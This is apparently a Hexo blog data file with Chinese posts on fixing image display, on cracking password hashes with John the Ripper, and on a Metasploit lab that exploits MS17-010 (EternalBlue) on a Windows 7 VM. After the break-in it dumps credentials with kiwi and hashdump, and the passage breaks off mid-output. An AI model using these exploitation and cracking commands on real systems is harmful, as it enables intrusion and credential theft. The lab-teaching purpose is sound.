class=\"\">\n\n<p>如上图，产生的图片放在了最早的md文件图片文件夹下面，而且还出现了“不难”字样。</p>\n<p>按上图，在没有清除public目录后执行&gt;hexo g产生的目录结果是这样的：</p>\n<img src=\"/2024/11/14/hexo%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98%E5%B9%B6%E4%B8%8D%E9%9A%BE/2024-11-14-23-43-59-image.png\" class=\"\">\n\n<p>最后附上操作截图：</p>\n<img src=\"/2024/11/14/hexo%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98%E5%B9%B6%E4%B8%8D%E9%9A%BE/2024-11-14-23-55-19-image.png\" class=\"\">\n\n<p>如果问题可以留言进行交流</p>\n","excerpt":"","more":"<p>首先要介绍一下我的软件使用版本</p>\n<p>执行node -v    npm -v    hexo -v    检测到的版本分别是 v22.11.0    10.9.0    7.3.0</p>\n<p>使用的是MarkText.exe 编辑器，在file菜单下的Preferences菜单的Image选项：</p>\n<img src=\"/2024/11/14/hexo%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98%E5%B9%B6%E4%B8%8D%E9%9A%BE/2024-11-14-23-19-21-image.png\" class=\"\">\n\n<p>上图中，我原来的设置是 .&#x2F;images&#x2F;${filename} 所以按网上的配置怎么处理都是有问题不显示图片的，但可以把md文件对应的图片文件夹拷贝到发布后的public文件夹下面的images文件夹也可以正常显示，但这样比较麻烦。</p>\n<p>在你的博客文件夹下执行cmd命令并</p>\n<p>npm install hexo-asset-img –save</p>\n<p>我使用的是上面这个插件，而不是hexo-asset-image，image这个怎么都无法显示图片。</p>\n<p><strong>【将_config.yml 文件中的post_asset_folder 选项设为 true 】</strong>是必须的！只有这样才能在执行hexo g的时候，在public文件夹下对应md文件夹内生成图片。</p>\n<p>目前是正常的，但有个问题，新建文件后有图片插入的，需要执行&gt;hexo clean    &gt;hexo g  &gt;hexo s  才能正常显示图片，如果只是&gt;hexo g    &gt;hexo s 还是不正常：</p>\n<img src=\"/2024/11/14/hexo%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98%E5%B9%B6%E4%B8%8D%E9%9A%BE/2024-11-14-23-40-00-image.png\" class=\"\">\n\n<p>如上图，产生的图片放在了最早的md文件图片文件夹下面，而且还出现了“不难”字样。</p>\n<p>按上图，在没有清除public目录后执行&gt;hexo g产生的目录结果是这样的：</p>\n<img src=\"/2024/11/14/hexo%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98%E5%B9%B6%E4%B8%8D%E9%9A%BE/2024-11-14-23-43-59-image.png\" class=\"\">\n\n<p>最后附上操作截图：</p>\n<img src=\"/2024/11/14/hexo%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98%E5%B9%B6%E4%B8%8D%E9%9A%BE/2024-11-14-23-55-19-image.png\" class=\"\">\n\n<p>如果问题可以留言进行交流</p>\n"},{"title":"john工具破解密码","date":"2024-11-15T13:31:09.000Z","_content":"\n#### john工具破解密码\n\n简单破解\n\n解密这个文件使用 john 自带的一个简单的密码文件，如果猜想用户的密码非常的简单例如 123456 这一类的可以使用这个命令 。比如下面这样。\n\njohn passwd.txt\n稍高级法\n\n如果我们要破解的用户密码稍微高级一些，比如根据用户名来设置密码，我们就需要John -Single 这个命令，原理是根据用户的名称，加上常见的变化而猜测密码。比如此用户叫test，而他的密码是test123、test1、tset、test123、...。\n\njohn --single passwd.txt\n自定义字典破解 --wordlist 参数\n\njohn --wordlist=big.txt passwd.txt\n--rules 参数\n\n-rules参数则在此基础上再加上些变化，如字典中有单词test，则john还会尝试使用tes、teSt、 tset等单词变化进行解密。\n\njohn --wordlist=big.txt passwd.txt --rules\n--restory 参数\n\n如果在破解密码的过程中由于某些原因中断了破解，使用 restory 继续破解密码 。\n\n--incrementa 参数\n\n使用遍历模式，就是使用字幕数字等组合密码的所有可能情况，一般不用，太浪费时间。如果你电脑速度够快又有足够的时间，可以来使用这种方式，这是威力最大的方式。\n\n--fork 参数\n\n同时开启多少个进程执行\n\njohn --format=mysql-sha1 --wordlist=/usr/share/wordlists/rockyou.txt passwd.txt --fork=10\n当我们破解成功后，john会将破解成功的hash缓存在我们家目录的`.john/john.pot`文件中，需要我们手动进行删除，否则下次爆破会出现\n\n![](john工具破解密码/2024-11-15-21-36-47-image.png)\n\n![](john工具破解密码/2022-12-21-13-01-13-2022-09-04-12-52-42-image.png)\n\n意思就是让我们`--show`查看破解成功的密码，或者`--format=LM`指定破解类型  \n需要手动删除`rm -rf ~/.john/john.pot`\n\n![](john工具破解密码/2022-12-21-13-01-35-2022-09-04-12-54-07-image.png)\n\n![](john工具破解密码/2022-12-21-13-03-23-2022-09-04-11-19-05-2442110-20220324092722184-817063347.png)\n\n我们知道`windows hash`的加密为`NTLM`，需要我们`--format`指定\n\n`--list=formats`和`--list=subformats`可以查看所支持的破解类型\n\n![](john工具破解密码/2022-12-21-13-04-05-2022-09-04-11-49-56-image.png)\n\n**不指定破解类型和字典直接破解** john会自动进行使用默认的字典，并识别我们的hash类型进行自动选择\n\n![](john工具破解密码/2022-12-21-13-05-33-2022-09-04-14-05-52-2442110-20220324093335099-1014764646.png)\n\n/usr/share/john目录下获取各种格式哈希的脚本工具\n\n![](john工具破解密码/2022-12-21-13-06-13-2022-09-04-13-00-45-image.png)\n\n命令方式\n\n` /usr/share/john/office2john.py /root/test.docx > docx.txt`\n\n指定掩码模式\n\n![](john工具破解密码/2022-12-21-13-06-30-2022-09-04-13-15-23-image.png)\n\n```\nd=数字\na=键盘95字\nl=英文小写\nu=英文大写\n```\n\n可以提前检查掩码设置是否正确 ` # john --mask=?d?d?d?d?d --stdout|head`\n\n![](john工具破解密码/2022-12-21-13-06-53-2022-09-04-13-19-12-image.png)\n","source":"_posts/john工具破解密码.md","raw":"---\ntitle: john工具破解密码\ndate: 2024-11-15 21:31:09\ntags: [crypto]\n\n---\n\n#### john工具破解密码\n\n简单破解\n\n解密这个文件使用 john 自带的一个简单的密码文件，如果猜想用户的密码非常的简单例如 123456 这一类的可以使用这个命令 。比如下面这样。\n\njohn passwd.txt\n稍高级法\n\n如果我们要破解的用户密码稍微高级一些，比如根据用户名来设置密码，我们就需要John -Single 这个命令，原理是根据用户的名称，加上常见的变化而猜测密码。比如此用户叫test，而他的密码是test123、test1、tset、test123、...。\n\njohn --single passwd.txt\n自定义字典破解 --wordlist 参数\n\njohn --wordlist=big.txt passwd.txt\n--rules 参数\n\n-rules参数则在此基础上再加上些变化，如字典中有单词test，则john还会尝试使用tes、teSt、 tset等单词变化进行解密。\n\njohn --wordlist=big.txt passwd.txt --rules\n--restory 参数\n\n如果在破解密码的过程中由于某些原因中断了破解，使用 restory 继续破解密码 。\n\n--incrementa 参数\n\n使用遍历模式，就是使用字幕数字等组合密码的所有可能情况，一般不用，太浪费时间。如果你电脑速度够快又有足够的时间，可以来使用这种方式，这是威力最大的方式。\n\n--fork 参数\n\n同时开启多少个进程执行\n\njohn --format=mysql-sha1 --wordlist=/usr/share/wordlists/rockyou.txt passwd.txt --fork=10\n当我们破解成功后，john会将破解成功的hash缓存在我们家目录的`.john/john.pot`文件中，需要我们手动进行删除，否则下次爆破会出现\n\n![](john工具破解密码/2024-11-15-21-36-47-image.png)\n\n![](john工具破解密码/2022-12-21-13-01-13-2022-09-04-12-52-42-image.png)\n\n意思就是让我们`--show`查看破解成功的密码，或者`--format=LM`指定破解类型  \n需要手动删除`rm -rf ~/.john/john.pot`\n\n![](john工具破解密码/2022-12-21-13-01-35-2022-09-04-12-54-07-image.png)\n\n![](john工具破解密码/2022-12-21-13-03-23-2022-09-04-11-19-05-2442110-20220324092722184-817063347.png)\n\n我们知道`windows hash`的加密为`NTLM`，需要我们`--format`指定\n\n`--list=formats`和`--list=subformats`可以查看所支持的破解类型\n\n![](john工具破解密码/2022-12-21-13-04-05-2022-09-04-11-49-56-image.png)\n\n**不指定破解类型和字典直接破解** john会自动进行使用默认的字典，并识别我们的hash类型进行自动选择\n\n![](john工具破解密码/2022-12-21-13-05-33-2022-09-04-14-05-52-2442110-20220324093335099-1014764646.png)\n\n/usr/share/john目录下获取各种格式哈希的脚本工具\n\n![](john工具破解密码/2022-12-21-13-06-13-2022-09-04-13-00-45-image.png)\n\n命令方式\n\n` /usr/share/john/office2john.py /root/test.docx > docx.txt`\n\n指定掩码模式\n\n![](john工具破解密码/2022-12-21-13-06-30-2022-09-04-13-15-23-image.png)\n\n```\nd=数字\na=键盘95字\nl=英文小写\nu=英文大写\n```\n\n可以提前检查掩码设置是否正确 ` # john --mask=?d?d?d?d?d --stdout|head`\n\n![](john工具破解密码/2022-12-21-13-06-53-2022-09-04-13-19-12-image.png)\n","slug":"john工具破解密码","published":1,"updated":"2024-11-15T14:19:03.773Z","comments":1,"layout":"post","photos":[],"_id":"cm3kcor2x000b8oi47ycx65qk","content":"<h4 id=\"john工具破解密码\"><a href=\"#john工具破解密码\" class=\"headerlink\" title=\"john工具破解密码\"></a>john工具破解密码</h4><p>简单破解</p>\n<p>解密这个文件使用 john 自带的一个简单的密码文件，如果猜想用户的密码非常的简单例如 123456 这一类的可以使用这个命令 。比如下面这样。</p>\n<p>john passwd.txt<br>稍高级法</p>\n<p>如果我们要破解的用户密码稍微高级一些，比如根据用户名来设置密码，我们就需要John -Single 这个命令，原理是根据用户的名称，加上常见的变化而猜测密码。比如此用户叫test，而他的密码是test123、test1、tset、test123、…。</p>\n<p>john –single passwd.txt<br>自定义字典破解 –wordlist 参数</p>\n<p>john –wordlist&#x3D;big.txt passwd.txt<br>–rules 参数</p>\n<p>-rules参数则在此基础上再加上些变化，如字典中有单词test，则john还会尝试使用tes、teSt、 tset等单词变化进行解密。</p>\n<p>john –wordlist&#x3D;big.txt passwd.txt –rules<br>–restory 参数</p>\n<p>如果在破解密码的过程中由于某些原因中断了破解，使用 restory 继续破解密码 。</p>\n<p>–incrementa 参数</p>\n<p>使用遍历模式，就是使用字幕数字等组合密码的所有可能情况，一般不用，太浪费时间。如果你电脑速度够快又有足够的时间，可以来使用这种方式，这是威力最大的方式。</p>\n<p>–fork 参数</p>\n<p>同时开启多少个进程执行</p>\n<p>john –format&#x3D;mysql-sha1 –wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt passwd.txt –fork&#x3D;10<br>当我们破解成功后，john会将破解成功的hash缓存在我们家目录的<code>.john/john.pot</code>文件中，需要我们手动进行删除，否则下次爆破会出现</p>\n<img src=\"/2024/11/15/john%E5%B7%A5%E5%85%B7%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/2024-11-15-21-36-47-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/john%E5%B7%A5%E5%85%B7%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/2022-12-21-13-01-13-2022-09-04-12-52-42-image.png\" class=\"\">\n\n<p>意思就是让我们<code>--show</code>查看破解成功的密码，或者<code>--format=LM</code>指定破解类型<br>需要手动删除<code>rm -rf ~/.john/john.pot</code></p>\n<img src=\"/2024/11/15/john%E5%B7%A5%E5%85%B7%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/2022-12-21-13-01-35-2022-09-04-12-54-07-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/john%E5%B7%A5%E5%85%B7%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/2022-12-21-13-03-23-2022-09-04-11-19-05-2442110-20220324092722184-817063347.png\" class=\"\">\n\n<p>我们知道<code>windows hash</code>的加密为<code>NTLM</code>，需要我们<code>--format</code>指定</p>\n<p><code>--list=formats</code>和<code>--list=subformats</code>可以查看所支持的破解类型</p>\n<img src=\"/2024/11/15/john%E5%B7%A5%E5%85%B7%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/2022-12-21-13-04-05-2022-09-04-11-49-56-image.png\" class=\"\">\n\n<p><strong>不指定破解类型和字典直接破解</strong> john会自动进行使用默认的字典，并识别我们的hash类型进行自动选择</p>\n<img src=\"/2024/11/15/john%E5%B7%A5%E5%85%B7%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/2022-12-21-13-05-33-2022-09-04-14-05-52-2442110-20220324093335099-1014764646.png\" class=\"\">\n\n<p>&#x2F;usr&#x2F;share&#x2F;john目录下获取各种格式哈希的脚本工具</p>\n<img src=\"/2024/11/15/john%E5%B7%A5%E5%85%B7%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/2022-12-21-13-06-13-2022-09-04-13-00-45-image.png\" class=\"\">\n\n<p>命令方式</p>\n<p><code> /usr/share/john/office2john.py /root/test.docx &gt; docx.txt</code></p>\n<p>指定掩码模式</p>\n<img src=\"/2024/11/15/john%E5%B7%A5%E5%85%B7%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/2022-12-21-13-06-30-2022-09-04-13-15-23-image.png\" class=\"\">\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">d=数字</span><br><span class=\"line\">a=键盘95字</span><br><span class=\"line\">l=英文小写</span><br><span class=\"line\">u=英文大写</span><br></pre></td></tr></table></figure>\n\n<p>可以提前检查掩码设置是否正确 <code> # john --mask=?d?d?d?d?d --stdout|head</code></p>\n<img src=\"/2024/11/15/john%E5%B7%A5%E5%85%B7%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/2022-12-21-13-06-53-2022-09-04-13-19-12-image.png\" class=\"\">\n","excerpt":"","more":"<h4 id=\"john工具破解密码\"><a href=\"#john工具破解密码\" class=\"headerlink\" title=\"john工具破解密码\"></a>john工具破解密码</h4><p>简单破解</p>\n<p>解密这个文件使用 john 自带的一个简单的密码文件，如果猜想用户的密码非常的简单例如 123456 这一类的可以使用这个命令 。比如下面这样。</p>\n<p>john passwd.txt<br>稍高级法</p>\n<p>如果我们要破解的用户密码稍微高级一些，比如根据用户名来设置密码，我们就需要John -Single 这个命令，原理是根据用户的名称，加上常见的变化而猜测密码。比如此用户叫test，而他的密码是test123、test1、tset、test123、…。</p>\n<p>john –single passwd.txt<br>自定义字典破解 –wordlist 参数</p>\n<p>john –wordlist&#x3D;big.txt passwd.txt<br>–rules 参数</p>\n<p>-rules参数则在此基础上再加上些变化，如字典中有单词test，则john还会尝试使用tes、teSt、 tset等单词变化进行解密。</p>\n<p>john –wordlist&#x3D;big.txt passwd.txt –rules<br>–restory 参数</p>\n<p>如果在破解密码的过程中由于某些原因中断了破解，使用 restory 继续破解密码 。</p>\n<p>–incrementa 参数</p>\n<p>使用遍历模式，就是使用字幕数字等组合密码的所有可能情况，一般不用，太浪费时间。如果你电脑速度够快又有足够的时间，可以来使用这种方式，这是威力最大的方式。</p>\n<p>–fork 参数</p>\n<p>同时开启多少个进程执行</p>\n<p>john –format&#x3D;mysql-sha1 –wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt passwd.txt –fork&#x3D;10<br>当我们破解成功后，john会将破解成功的hash缓存在我们家目录的<code>.john/john.pot</code>文件中，需要我们手动进行删除，否则下次爆破会出现</p>\n<img src=\"/2024/11/15/john%E5%B7%A5%E5%85%B7%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/2024-11-15-21-36-47-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/john%E5%B7%A5%E5%85%B7%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/2022-12-21-13-01-13-2022-09-04-12-52-42-image.png\" class=\"\">\n\n<p>意思就是让我们<code>--show</code>查看破解成功的密码，或者<code>--format=LM</code>指定破解类型<br>需要手动删除<code>rm -rf ~/.john/john.pot</code></p>\n<img src=\"/2024/11/15/john%E5%B7%A5%E5%85%B7%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/2022-12-21-13-01-35-2022-09-04-12-54-07-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/john%E5%B7%A5%E5%85%B7%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/2022-12-21-13-03-23-2022-09-04-11-19-05-2442110-20220324092722184-817063347.png\" class=\"\">\n\n<p>我们知道<code>windows hash</code>的加密为<code>NTLM</code>，需要我们<code>--format</code>指定</p>\n<p><code>--list=formats</code>和<code>--list=subformats</code>可以查看所支持的破解类型</p>\n<img src=\"/2024/11/15/john%E5%B7%A5%E5%85%B7%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/2022-12-21-13-04-05-2022-09-04-11-49-56-image.png\" class=\"\">\n\n<p><strong>不指定破解类型和字典直接破解</strong> john会自动进行使用默认的字典，并识别我们的hash类型进行自动选择</p>\n<img src=\"/2024/11/15/john%E5%B7%A5%E5%85%B7%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/2022-12-21-13-05-33-2022-09-04-14-05-52-2442110-20220324093335099-1014764646.png\" class=\"\">\n\n<p>&#x2F;usr&#x2F;share&#x2F;john目录下获取各种格式哈希的脚本工具</p>\n<img src=\"/2024/11/15/john%E5%B7%A5%E5%85%B7%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/2022-12-21-13-06-13-2022-09-04-13-00-45-image.png\" class=\"\">\n\n<p>命令方式</p>\n<p><code> /usr/share/john/office2john.py /root/test.docx &gt; docx.txt</code></p>\n<p>指定掩码模式</p>\n<img src=\"/2024/11/15/john%E5%B7%A5%E5%85%B7%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/2022-12-21-13-06-30-2022-09-04-13-15-23-image.png\" class=\"\">\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">d=数字</span><br><span class=\"line\">a=键盘95字</span><br><span class=\"line\">l=英文小写</span><br><span class=\"line\">u=英文大写</span><br></pre></td></tr></table></figure>\n\n<p>可以提前检查掩码设置是否正确 <code> # john --mask=?d?d?d?d?d --stdout|head</code></p>\n<img src=\"/2024/11/15/john%E5%B7%A5%E5%85%B7%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/2022-12-21-13-06-53-2022-09-04-13-19-12-image.png\" class=\"\">\n"},{"title":"metasploit渗透测试入门","date":"2024-11-15T11:48:49.000Z","_content":"\n# metasploit渗透测试入门\n\n![loading-ag-445](metasploit渗透测试入门/eda8f852311aeedff007fa3c146d4a0ccb113e3e.png)\n\n![](metasploit渗透测试入门/5a10b2b436d19787fabe4a53785605bf3e48d9d0.png)\n\nWannaCry勒索病毒席卷全球，一旦中了WannaCry病毒电脑文件会被“加密劫持”，黑客要求受害者支付高昂赎金（比特币）才能拿到解密秘钥。 而这枚WannaCry勒索病毒，就是黑客拿着美国安全局泄露的永恒之蓝攻击代码进行研制，并进行大肆勒索传播。\n\nMS17-010是Windows SMBv1服务中存在的远程代码执行漏洞；\n • 开启SMB服务（ 445端口） 的的系统可被执行远程代码， 从而导致被远程控制；\n • 受影响系统： Windows XP、 Windows 7/8/10、 Server 2003/2008/2012/2016\n\n只要用户打上MS17-010这个补丁，就可以避免这次攻击。\n\n## MSF 基础简介\n\nMetasploit 是一个渗透测试平台，使您能够查找，利用和验证漏洞。该平台包括 Metasploit 框架及其商业对手，如 Metasploit Pro。 Metasploit 目前是全球最常见的渗透测试框架，位居 secTools 排行榜第 2 位。\n\nmetasploit是一款kali自带的漏洞利用神器，在接下来的2个案例中，我们将<u>利用WIN7主机的ms17-010漏洞和XP主机的ms08-067漏洞</u>，进行渗透攻击演示，并获得目标主机的控制权，带你闯进渗透测试的神之领域。实验可以参考David Kennedy的《Metasploit:The Penetration Tester's Guide》，清华大学诸葛建伟老师翻译的《Metasploit渗透测试指南》。\n\n在**kali虚拟机**中打开**metasploit**，命令行输入：`msfconsole`\n\n<mark>MSF 模块组织按照不同的用途分为 7 种类型的模块（Modules）：</mark>\n\n1、辅助模块 Auxiliary（Aux)，执行扫描之类的动作\n\n2、渗透攻击模块 Exploits，用于实际发起渗透攻击\n\n3、攻击载荷模块（payloads) 目标系统被成功渗透后执行的代码，payload 中的主要内容包括 shellcode，一段获取 shell 的代码。\n\n后面这几个模块一般不是很常用，大家简单的了解一下\n\n4、后渗透攻击模块（Post)\n\n5、编码器模块（Encoders)\n\n6、空指令模块（Nops)\n\n7、免杀模块 （evasion)\n\n<mark>MSF 常用命令</mark>\n\n```\nsearch 根据关键字搜索模块 \nshow auxiliary 查看所有可用的辅助攻击模块 \nshow exploits 查看所有可用的渗透攻击模块 \nshow targets 查看所有载荷代码\nshow options \ninfo 显示模块的详细信息 \nuse 使用指定的测试模块 \nback 退出一级\nexit 退出\nset/unset 设置/取消 当前模块的参数\nrun/exploit 执行扫描/渗透（2都相同效果）\n```\n\n实战：ms17-010 永恒之蓝\n\n查找 ms17-010 漏洞模块，搜索ms17-010相关漏洞利用代码： \nmsf5 > search ms17-010\n\n![](metasploit渗透测试入门/a407b4cba8e4b90ee8e7fd7d59b2d52996bf8f22.png)\n\n![](metasploit渗透测试入门/2a26300befbffa17c2ba8ecadb69c3c8b45991d0.png)\n\n![](metasploit渗透测试入门/0862cf5b165437ac801778afa9704d627edc4618.png)\n\n![](metasploit渗透测试入门/2ace2cb635e639587e21a850f0b364cf76eef144.png)\n\n##### <mark>实战：ms17-010 永恒之蓝</mark>\n\n```\n需准备环境：Kali-Linux、Windows 7 虚拟机\nKali-Linux ：192.168.182.128\nWindows 7： 192.168.182.134（确保处在同个网络下，能互相ping通）\n```\n\n第一步：\n\n查找 ms17-010 漏洞模块，搜索ms17-010相关漏洞利用代码： \nmsf6 > search ms17-010\n\n![](metasploit渗透测试入门/f65b3dca8ecb31a23577e4e6ba6962faa3e87ee9.png)\n\n这里可以得到两个工具，其中\n\n**auxiliary/scanner/smb/smb_ms17_010**是永恒之蓝扫描模块，**exploit/windows/smb/ms17_010_eternalblue**是永恒之蓝渗透代码，\n\n前者先扫描，若显示有漏洞，再用后者进行渗透。\n\n第二步：\n\n```\n使用ms17-010扫描模块对靶机Win7进行扫描，才能进行下一步的渗透操作。\nmsf6 > use 3   //使用ms17-010扫描模块，对靶机Win7进行扫描\nmsf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOST 192.168.86.132   //设置目标IP或网段\nRHOST => 192.168.86.132\nmsf6 auxiliary(scanner/smb/smb_ms17_010) > run   //执行扫描\n\n[+] 192.168.182.134:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)   //说明扫描到的这台win 7存在ms17-010漏洞\n[*] 192.168.182.134:445    - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf6 auxiliary(scanner/smb/smb_ms17_010) > back\n```\n\n![](metasploit渗透测试入门/d09f62c099a26f1f397576023f83af77ad0d31f3.png)\n\n从上图画红线处知道，扫描到的这台win7 存在ms17-010漏洞\n\n第三步：\n\n```\n使用ms17-010渗透模块对靶机Win7进行渗透\nmsf6 > use 0   //使用ms17-010渗透模块对靶机Win7进行渗透\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > show options  //查看可设置的选项\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 192.168.182.134\nRHOST => 192.168.182.134   //设置渗透目标IP\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > exploit   //执行渗透\n```\n\n![](metasploit渗透测试入门/4bc0ab674fd9e7529eb6ac5d7538693e1c0dd92a.png)\n\n![](metasploit渗透测试入门/66ba7fc4908ffcfa0b7b82bc686e3820438307c5.png)\n\n从上图可见已经成功渗透到win7。\n\n不信！那你可以用pwd，dir，shell 检查一下,或是execute -i -f cmd.exe来执行cmd命令，又或者可以screenshot截图\n\n![](metasploit渗透测试入门/9eec7d01622ce0d8fcd9640995e2de29933f3a7f.png)\n\n![](metasploit渗透测试入门/588549d38cf8fc5ce11280eb3b1cc2b9f7ee8d1b.png)\n\n或者也可以用以下2条命令查看系统用户名和密码\n\n```\nload kiwi\ncreds_all\n```\n\n![](metasploit渗透测试入门/6fe033baccfc41288ad6d787c56426f8b75705e9.png)\n\n到了这里，上面这些命令的执行，都是后渗透测试的问题了，既是windows下的cmd命令及其相关操作的事情了。下面再来一个获得用户hash值的命令\n\n`run post/windows/gather/hashdump`\n\n![](metasploit渗透测试入门/dd1b7a71f912663ff9bcc131969d1409525cce78.png)\n\n![](metasploit渗透测试入门/4d4f742c5f19cef39b952324c9c120b4a61ed63c.png)\n\n注：不要忘记了保存哦，下次可以直接再利用哈～下面借别人的图展示：\n\n![](metasploit渗透测试入门/01a74c8cbd00d662af1d6e41c15dbd613947e9e3.jpg)\n\n后渗透测试中会有很多好玩的指令操作，如打开摄像头，删除文件，删除目标主机目录，创建系统用户等等。\n\n![](metasploit渗透测试入门/85a98c0d5bb71142f0e74a173b6faf1bc6d24a53.gif)\n\n![](metasploit渗透测试入门/7976c0056e23f81c48a5e58c3c590d627a882e33.png)\n\n![](metasploit渗透测试入门/0d1cb80ec5a6b930880952b22bcafd244716b33d.png)\n\n![](metasploit渗透测试入门/fec279cd0cec3e3ebd0f93b1ffb8ee97ad616631.png)\n","source":"_posts/metasploit渗透测试入门.md","raw":"---\ntitle: metasploit渗透测试入门\ndate: 2024-11-15 19:48:49\ntags:\n---\n\n# metasploit渗透测试入门\n\n![loading-ag-445](metasploit渗透测试入门/eda8f852311aeedff007fa3c146d4a0ccb113e3e.png)\n\n![](metasploit渗透测试入门/5a10b2b436d19787fabe4a53785605bf3e48d9d0.png)\n\nWannaCry勒索病毒席卷全球，一旦中了WannaCry病毒电脑文件会被“加密劫持”，黑客要求受害者支付高昂赎金（比特币）才能拿到解密秘钥。 而这枚WannaCry勒索病毒，就是黑客拿着美国安全局泄露的永恒之蓝攻击代码进行研制，并进行大肆勒索传播。\n\nMS17-010是Windows SMBv1服务中存在的远程代码执行漏洞；\n • 开启SMB服务（ 445端口） 的的系统可被执行远程代码， 从而导致被远程控制；\n • 受影响系统： Windows XP、 Windows 7/8/10、 Server 2003/2008/2012/2016\n\n只要用户打上MS17-010这个补丁，就可以避免这次攻击。\n\n## MSF 基础简介\n\nMetasploit 是一个渗透测试平台，使您能够查找，利用和验证漏洞。该平台包括 Metasploit 框架及其商业对手，如 Metasploit Pro。 Metasploit 目前是全球最常见的渗透测试框架，位居 secTools 排行榜第 2 位。\n\nmetasploit是一款kali自带的漏洞利用神器，在接下来的2个案例中，我们将<u>利用WIN7主机的ms17-010漏洞和XP主机的ms08-067漏洞</u>，进行渗透攻击演示，并获得目标主机的控制权，带你闯进渗透测试的神之领域。实验可以参考David Kennedy的《Metasploit:The Penetration Tester's Guide》，清华大学诸葛建伟老师翻译的《Metasploit渗透测试指南》。\n\n在**kali虚拟机**中打开**metasploit**，命令行输入：`msfconsole`\n\n<mark>MSF 模块组织按照不同的用途分为 7 种类型的模块（Modules）：</mark>\n\n1、辅助模块 Auxiliary（Aux)，执行扫描之类的动作\n\n2、渗透攻击模块 Exploits，用于实际发起渗透攻击\n\n3、攻击载荷模块（payloads) 目标系统被成功渗透后执行的代码，payload 中的主要内容包括 shellcode，一段获取 shell 的代码。\n\n后面这几个模块一般不是很常用，大家简单的了解一下\n\n4、后渗透攻击模块（Post)\n\n5、编码器模块（Encoders)\n\n6、空指令模块（Nops)\n\n7、免杀模块 （evasion)\n\n<mark>MSF 常用命令</mark>\n\n```\nsearch 根据关键字搜索模块 \nshow auxiliary 查看所有可用的辅助攻击模块 \nshow exploits 查看所有可用的渗透攻击模块 \nshow targets 查看所有载荷代码\nshow options \ninfo 显示模块的详细信息 \nuse 使用指定的测试模块 \nback 退出一级\nexit 退出\nset/unset 设置/取消 当前模块的参数\nrun/exploit 执行扫描/渗透（2都相同效果）\n```\n\n实战：ms17-010 永恒之蓝\n\n查找 ms17-010 漏洞模块，搜索ms17-010相关漏洞利用代码： \nmsf5 > search ms17-010\n\n![](metasploit渗透测试入门/a407b4cba8e4b90ee8e7fd7d59b2d52996bf8f22.png)\n\n![](metasploit渗透测试入门/2a26300befbffa17c2ba8ecadb69c3c8b45991d0.png)\n\n![](metasploit渗透测试入门/0862cf5b165437ac801778afa9704d627edc4618.png)\n\n![](metasploit渗透测试入门/2ace2cb635e639587e21a850f0b364cf76eef144.png)\n\n##### <mark>实战：ms17-010 永恒之蓝</mark>\n\n```\n需准备环境：Kali-Linux、Windows 7 虚拟机\nKali-Linux ：192.168.182.128\nWindows 7： 192.168.182.134（确保处在同个网络下，能互相ping通）\n```\n\n第一步：\n\n查找 ms17-010 漏洞模块，搜索ms17-010相关漏洞利用代码： \nmsf6 > search ms17-010\n\n![](metasploit渗透测试入门/f65b3dca8ecb31a23577e4e6ba6962faa3e87ee9.png)\n\n这里可以得到两个工具，其中\n\n**auxiliary/scanner/smb/smb_ms17_010**是永恒之蓝扫描模块，**exploit/windows/smb/ms17_010_eternalblue**是永恒之蓝渗透代码，\n\n前者先扫描，若显示有漏洞，再用后者进行渗透。\n\n第二步：\n\n```\n使用ms17-010扫描模块对靶机Win7进行扫描，才能进行下一步的渗透操作。\nmsf6 > use 3   //使用ms17-010扫描模块，对靶机Win7进行扫描\nmsf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOST 192.168.86.132   //设置目标IP或网段\nRHOST => 192.168.86.132\nmsf6 auxiliary(scanner/smb/smb_ms17_010) > run   //执行扫描\n\n[+] 192.168.182.134:445    - Host is likely VULNERABLE to 